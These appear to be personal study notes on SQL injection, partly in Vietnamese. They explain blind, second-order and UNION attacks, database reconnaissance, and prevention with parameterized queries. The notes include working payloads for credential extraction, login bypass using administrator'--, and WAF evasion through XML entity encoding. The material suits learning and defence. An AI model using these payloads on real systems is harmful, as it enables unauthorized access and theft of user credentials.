## Blind SQL Injection Vulnerabilities

Blind SQL injection occurs when applications don't return query results or error details but remain vulnerable to data extraction:

### Exploitation Techniques

1. **Boolean-based**
   - Inject conditions that cause detectable response differences
   - Example: Inject logic that changes page content when a condition is true

2. **Time-based**
   - Introduce conditional time delays
   - Example: Use functions like SLEEP() that only execute when conditions are met
   - Infer data by measuring response time variations

3. **Out-of-band (OAST)**
   - Force the database to make external network connections
   - Example: Inject code that sends DNS lookups containing extracted data
   - Most powerful technique when other methods fail
   - Allows direct data exfiltration through controlled channels

These techniques enable attackers to gradually extract data even when no visible feedback is provided by the application.

## Second-Order SQL Injection

Second-order (stored) SQL injection differs from first-order attacks in timing and execution:

### Key Differences

1. **First-Order Injection**
   - Input from HTTP request directly used in SQL query
   - Vulnerability exploited immediately in same request

2. **Second-Order Injection**
   - Input stored safely in database initially (no immediate vulnerability)
   - Stored data later retrieved and unsafely incorporated into SQL query
   - Also called "stored SQL injection"

### Why It Happens
- Developers properly sanitize input during storage
- Same data later considered "trusted" since it came from database
- Sanitization omitted during subsequent usage
- False sense of security leads to vulnerability

This attack is more difficult to detect because the exploit occurs in a separate operation from the initial input submission.

## 3. How to detect

### Overall:

To manually detect SQL injection, test each input point using the following techniques:

- Submit a **single quote (`'`)** and check for errors or anomalies.
- Use **SQL-specific syntax** to alter values and observe response differences.
- Try **boolean conditions** like `OR 1=1` and `OR 1=2` to detect logic-based flaws.
- Use **time-based payloads** to identify blind SQLi by measuring response delays.
- Send **OAST payloads** to trigger out-of-band interactions and monitor for callbacks.

SQL injection often occurs in the `WHERE` clause of `SELECT` queries, but it can also appear in other parts of various SQL statements:

- In `UPDATE` statements — within updated values or the `WHERE` clause.
- In `INSERT` statements — within inserted values.
- In `SELECT` statements — within table or column names.
- In `SELECT` statements — within the `ORDER BY` clause.


### 3.1. Error-based

- Submit SQL-specific characters like: `'` or `"` and look for errors or anomalies
- Different characters can give you different errors --> (Do Fuzz to check)

### 3.2. Union-based

- Use UNION operator.
- Follow 2 basic rule of UNION:
    + Number and the other columns must be the same in all queries
    + The data type must be compatible
- Exploitation:
  + Figure out the number of columns that the query is making
  + Figure out the data types of the columns (mainly interested in string data)
  + Use UNION operator to output info from DB.
- Find the number of columns:
  + Using **ORDER BY**: `= ... order by 1`. Tăng số 1 lên đến khi gặp lỗi. Số trước khi gặp lỗi là số lượng columns có trong DB
  + Using **NULL Values**: `= ... UNION SELECT NULL--`. Tăng dần số lượng NULL đến khi dò ra được số columns: `'UNION SELECT NULL, NULL--`
- Find datatype (Vì ta chỉ quan trọng đến dạng string, nên ta sẽ test xem các columns có thể chứa giá trị là string hay không):
  + `' UNION SELECT 'a', NULL--`. Nếu fail, tiếp tục columns tiếp: `' UNION SELECT NULL, 'a'--`. Và so on...

### 3.3. Boolean-Based Blind SQLi

- Submit a Boolean condition that evaluates to **False** and note the response
- Submit a Boolean condition that evaluates to **TRUE** and note the response
- If the response is different = SQLi boolean blind vuln
- Write a program/use tools that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response

### 3.4. Time-Based Blind SQLi

- Submit a payload that pause the app for a specified period of time
- If the app does pause = Vuln
- Use tools/Write a program that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response time

### 3.5. Out-of-band SQLi

- Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query and monitor for any resulting interactions
- Depending on SQLi use different methods to exfil data

# 4. SQL injection UNION attacks

SQL injection UNION attacks exploit vulnerabilities to retrieve data from different database tables by appending additional SELECT queries to the original query.

## Requirements for UNION Attacks
- Both queries must return the same number of columns
- Data types in corresponding columns must be compatible

## Determining Column Count
Two main methods:

1. **ORDER BY Method**:
   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ```
   Increment until you get an error.

2. **NULL Method**:
   ```sql
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
   ```
   NULL is used because it's compatible with all data types. When the column count matches, you'll see additional content or a different response.

Once you know the column count, you can target specific tables and columns in your injection.

## 4.2 - Database-Specific SQL Injection Syntax

### Oracle Specifics
- Requires `FROM` keyword with a valid table
- Use built-in `dual` table:
  ```sql
  ' UNION SELECT NULL FROM DUAL--
  ```

### Comment Syntax Variations
- MySQL requires space after double-dash: `-- `
- MySQL also accepts hash symbol: `#`

### Finding String-Compatible Columns
After determining column count, test each column for string compatibility:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If no error occurs and 'a' appears in the response, that column can hold string data and can be used to extract information from the database.

---

## 4.3 - SQL Injection: Using UNION to Retrieve Data

Once you know:
- How many columns the original query returns
- Which columns accept string data

You can use a **UNION SQL injection** to extract data.

### Example Scenario:
- Query returns **2 string columns**
- Injection point is inside a **quoted string** in the `WHERE` clause
- There's a table called `users` with columns `username` and `password`

### Injection Payload:
```sql
' UNION SELECT username, password FROM users--
```

This retrieves usernames and passwords from the `users` table.

### Note:
To perform this attack, you need to know:
- Table and column names (`users`, `username`, `password`)

You can discover them using features available in most databases that let you explore the structure (e.g., information schema).

# 5. Prevent

- Primary Defenses:
  + Op1: Use of Prepared Statements (Parameterized Queries)
  + Op2: Use of Stored Procedures (Partial)
  + Op3: Whitelist Input Validation (Partial)
  + Op4: Escaping All User Supplied Input (Partial)

- Additional Defenses:
  + Op5: Enforcing Least Privilege
  + Op6: Performing Whitelist Input Validation as a Secondary Defense


### Use Parameterized Queries (Prepared Statements):

#### Vulnerable Example:
```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

#### Secure Example:
```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

### Key Points:
- Parameterized queries separate code from data
- Use for handling untrusted input in WHERE clauses and INSERT/UPDATE values
- For parts that can't be parameterized (table names, column names, ORDER BY):
  - Use whitelisting of permitted values
  - Implement alternative logic

### Important:
- **Always** use hard-coded query strings
- **Never** mix string concatenation with parameterized queries
- Don't try to determine if data is "safe" case-by-case

# 6. Thoughts on starting

- Steps for an SQLi PoC:
  1. Identify injectable points: Find input fields or URL parameters that interact with the database.
  2. Inject SQL syntax: Add characters like ' or ", OR 1=1, --, etc., to see if the database responds in an unexpected way.
  3. Observe responses: If the query breaks or behaves differently (returns all data, errors, etc.), it's likely vulnerable.

- Keep note:
  1. Try to figure out what SQL query being used, end goal: like what we trying to display
  2. Take a look at the url and its parameter
  3. Look at the content of the page, it might tell the columns and datatype of the table
  4. Try figure out the communication between the web and back-end
  5. Review the methodology

- Try poking the target with **syntax** like `'`; `' --` or with **query** like `' order by 1 --`. If the **order by** query result in something interesting, try increase the **number** to figure out number of **columns**. 

- To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
  + **The type and version of the database software**.
  + **The tables and columns that the database contains**.

## Note about SQLi:

**After** finding and testing simple payloads to the vulnerable entry point, below are guided steps to carry on further:

| Database type	| Query |

**Note:** In **Oracle** database, when you try to find the number of columns in your entry point with ` UNION SELECT null, null, ...` command, add ` from dual` in order to work. **Oracle** has different command than other.
> - **Try using AI to find further command syntax of Oracle DB** 

Example: `' UNION SELECT @@version--`
Notice: each type of database may have different but similar query structure. Example, `' union select NULL, banner from v$version --`. As i was trying to retrieve `banner` from the `v$version`. 

In some cases, some **characters, operator or syntax** might be filtered which result in **error** being displayed. Try figure out which one got **filtered, or not accepted** by the **type of DB**. Example: when i tried `' order by 1 --` --> **error** but with `' order by 1 #` --> **200 OK**.

## Step 2: Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

Getting Current Database Name (PostGreSQL):

`SELECT current_database()`

Listing All Available Databases:

`SELECT datname FROM pg_database`

For example, you can query `information_schema.tables` to list the **tables** in the database: 

`SELECT table_name, null FROM information_schema.tables`

Then, with **table names** being shows, we can use it to list all **columns** of each: (assuming we've found a table named: **User**)

`SELECT column_name, null FROM information_schema.columns WHERE table_name = 'Users'`

**Notice:**
> - Be aware of the query column you have. Best to find out how many column you can use here. (test by using command: `' ORDER BY 1 --`, then increasing that number to 2, 3, 4. The cap before error is the number of column you have. Or test by `' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL -- 
` keep adding `null` value. The cap is the number of column.)
 
On Oracle, you can find the same information as follows:
- You can list tables by querying `all_tables`: `SELECT * FROM all_tables`
- You can list columns by querying `all_tab_columns`: `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

## Step 3: Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input: (assuming we've found a table named: **User** and we only have 1 column to query)

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character. The results from the query contain all the usernames and passwords, for example:

`administrator~s3cure` <br>
`wiener~peter` <br>
`carlos~montoya`



# 7. Example Scenario and additional information

##76.1 - Retrieving hidden data

A basic SQL injection vulnerability allows attackers to bypass application logic and access hidden data:

### Example Scenario
- Normal request: `https://insecure-website.com/products?category=Gifts`
- Normal SQL: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

### Attack Methods
1. **Comment Attack**
   - Request: `https://insecure-website.com/products?category=Gifts'--`
   - SQL result: `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
   - Effect: Comment (`--`) removes the released condition, showing unreleased products

2. **OR Condition Attack**
   - Request: `https://insecure-website.com/products?category=Gifts'+OR+1=1--`
   - SQL result: `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
   - Effect: Returns all products regardless of category due to `OR 1=1` always being true

## 7.2 - Subverting Application Logic

A simple SQL injection attack can bypass login authentication:

### Example Scenario
- Normal login process checks: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

### Attack Method
- Attack input: Username = `administrator'--`, Password = ` ` (blank)
- Resulting SQL: `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
- Effect: Comment (`--`) removes the password check entirely
- Result: Attacker gains access as the administrator without knowing the password

This vulnerability allows authentication bypass by manipulating the SQL query structure to eliminate the password verification.

## 7.3 - Retrieving data from other database tables

SQL injection can extract data from unrelated tables using the UNION operator:

### Example Scenario
- Normal query: `SELECT name, description FROM products WHERE category = 'Gifts'`

### Attack Method
- Attack input: `' UNION SELECT username, password FROM users--`
- Resulting SQL: `SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'`
- Effect: UNION combines results from the products table with sensitive data from the users table
- Result: Application returns product information along with all usernames and passwords

This technique allows attackers to access data from any table in the database by appending additional queries to the original one.

## 7.4 - Examining the Database

When exploiting SQL injection, understanding the target database is crucial:

### Database Differences
- Core SQL features work similarly across platforms
- Implementation details vary significantly between database types
- Key differences include:
  - String concatenation syntax
  - Comment formatting
  - Support for batched/stacked queries
  - Platform-specific APIs
  - Error message formats

### Information Gathering
1. **Database Version**
   - Oracle example: `SELECT * FROM v$version`
   - Different syntax reveals database type

2. **Database Structure**
   - Common approach: `SELECT * FROM information_schema.tables`
   - Reveals available tables and their structure

This reconnaissance helps tailor subsequent injection attempts to the specific database technology, making attacks more effective.

## 7.5 - SQL Injection in Different Contexts

SQL injection attacks can occur beyond query string parameters:

### Alternative Input Vectors
- JSON data submissions
- XML formatted requests
- HTTP headers
- Cookie values
- Any application input that flows to SQL queries

### Bypassing Defenses
- Web Application Firewalls (WAFs) often look for common SQL keywords
- Alternative data formats provide obfuscation opportunities
- Encoding techniques can bypass filters:
  - Example: XML escape sequence encoding
  - `<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>`
  - The `S` in `SELECT` is encoded as `&#x53;`

These variations allow attackers to evade detection while still executing malicious SQL when the application decodes the input before query execution.
